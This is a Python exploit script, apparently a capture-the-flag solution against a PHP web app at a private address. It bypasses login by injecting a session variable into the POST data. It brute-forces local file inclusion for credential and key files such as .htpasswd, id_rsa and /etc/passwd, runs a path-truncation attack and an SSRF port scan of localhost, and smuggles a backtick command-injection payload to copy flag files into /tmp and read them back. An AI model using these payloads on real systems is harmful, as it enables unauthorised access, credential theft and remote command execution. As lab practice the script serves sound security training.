from base64 import b64decode,b64encode
import requests, sys
import re

port = 51311

files = [
    "other-vhosts-access-log",
    "httpd",
    "default-server",
    "apache",
    "apache2",
    "server-httpd",
    "ports",
    "000-default",
    "default-ssl",
    "vhosts",
    "default",
    "config",
    "default",
    "security",
    "envvars",
    "acces.log",
    "acces_log",
    "error_log",
    ".hta",
    "dms",
    "srm",
    "moddav",
    "plsql",
    "uix",
    "ojsp",
    "oiddas",
    "access",
    "iaspt",
    "ssl",
    "oracle_apache",
    "mime.types",
    "mod_oc4j",
    "mod_osso",
    "php.ini",
    "apache",
    "proftpd",
    "vsftpd",
    "_php-fpm.pool.inc",
    "ftpaccess",
    "ftpusers",
    "pure-ftpd",
    "loadmodule",
    "httpd.conf.default",
    "manifest.json",
    ".htpasswd",
    ".htaccess",
    ".passwd",
    "bash_history",
    "sitemap.xml",
    "env",
    "app.ini",
    "app",
    "maillog",
    "app.conf",
    "web.manifest",
    "web",
    "my.cnf",
    "access_log",
    "error_log",
    "access.log",
    "error.log",
    "authorized_keys",
    "id_rsa",
    "bash_history",
    "mysql_history",
    "server.xml",
    "my.cnf",
    "index.cgi",
    "cgi-script.cgi",
    "test",
]

def test():
    payloadlfi = {"file": [f"..mdr", "cadeaux/nathan.txt", "cadeaux/nathan.txt", "cadeaux/../cadeaux/nathan.txt"]}
    res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadlfi).text
    #print(res)
    if "jimmy" in res:
        print("Filter triggered")
    elif "Not Found" in res or "Connection refused" in res or "Warning" in res:
        print(f"Non trouvé")
    else:
        print(res)
        print(f"Trouvé")
        
def bruteforce(name):
    possibilities = [
        f"{name}",
        f"{name}",
        f"etc/httpd/conf/{name}",
        f"etc/httpd/logs/{name}",
        f"apache2/log/{name}",
        f"apache/log/{name}",
        f"apache/logs/{name}",
        f"apache2/logs/{name}",
        f"apache2/conf/{name}",
        f"apache2/{name}",
        f"apache/{name}",
        f"conf-available/{name}",
        f"apache/bin/{name}",
        f"apache/conf/{name}",
        f"httpd/{name}",
        f"etc/apache2/{name}",
        f"etc/apache/{name}",
        f"etc/apache2/sites-available/{name}",
        f"etc/apache2/sites-enabled/{name}",
        f"apache2/sites-available/{name}",
        f"apache2/sites-enabled/{name}",
        f"apache/sites-enabled/{name}",
        f"apache/sites-available/{name}",
        f"sites-available/{name}",
        f"sites-enabled/{name}",
        f"conf.d/{name}",
        f"vhosts.d/{name}",
        f"conf/{name}",
    ]
    prefixes = [
        "",
        "./"
    ]
    extensions = [
        "",
        ".conf",
        ".txt",
    ]
    for possibility in possibilities:
        for pre in prefixes:
            for ext in extensions:
                name=f"{pre}{possibility}{ext}"
                print(f"Trying {name}")
                payloadlfi = {"file": name}
                res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadlfi).text
                if "jimmy" in res:
                    pass
                elif "file_get_" in res:
                    pass
                else:
                    #print(res)
                    print(f"=====================> Trouvé {name}")
                    exit()
    
def bruteforceFile(name):
    with open(name) as file:
        for line in file:
            line=line.rstrip()
            if len(line) > 0:
                print(f"Trying {line}")
                payloadlfi = {"file": line}
                res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadlfi).text
                if "jimmy" in res:
                    pass
                elif "file_get_" in res:
                    pass
                else:
                    #print(res)
                    print(f"=====================> Trouvé {line}")
                    exit()
    
def SSRF():
    porttest = 1
    while porttest<99999:
        payloadlfi = {"file": f"http://127.0.0.1:{porttest}/"}
        res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadlfi).text
        #print(res)
        if "Not Found" in res or "Connection refused" in res:
            pass
            #print(f"Echec {val}")
        else:
            print(f"Port trouvé {porttest}")
        porttest = porttest + 1
    
def Truncation():
    keep=True
    #va = 23001337
    #val = 2097140
    val = 2000000
    while keep:
        payloadlfi = {"file": "./"*val+"../../../../etc/passwd"}
        res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadlfi).text
        #print(res)
        if "jimmy" in res:
            print(f"Echec {val}")
            val = val + 10000
        else:
            keep=False
            print(res)
            print(f"Pas d'erreur {val}")

if __name__ == "__main__":
    S = requests.Session()
    payloadadmin = {"username": "admin", "password": "pass", "_SESSION[isLogged]": 1}
    res = S.post(f"http://192.168.120.11:{port}/login.php", data=payloadadmin).text
    if "File to see" in res:
        print("Connected as admin")
        print(S.cookies.get_dict())
    payloadRCE = {"file": "`cat /flag* > /tmp/salta`", "hash": "460fb12c04c82a20fc47652e45d8abafb2a47d74facd715846a2a440e8ee1b12"}
    res = S.post(f"http://santaadmin.presents.local:{port}/", data=payloadRCE).text
    payloadLFI = {"file": "file://localhost/tmp/salta"}
    res = S.post(f"http://192.168.120.11:{port}/admin.php", data=payloadLFI)
    print(res)
    regex=r'lead">(.*)<'
    matches = re.search(regex, res.text, re.DOTALL)
    if matches:
        print(matches)
    #test()
    #Truncation()
    #SSRF()
    #for file in files:
    #    bruteforce(file)
    #bruteforceFile('dirtest.txt')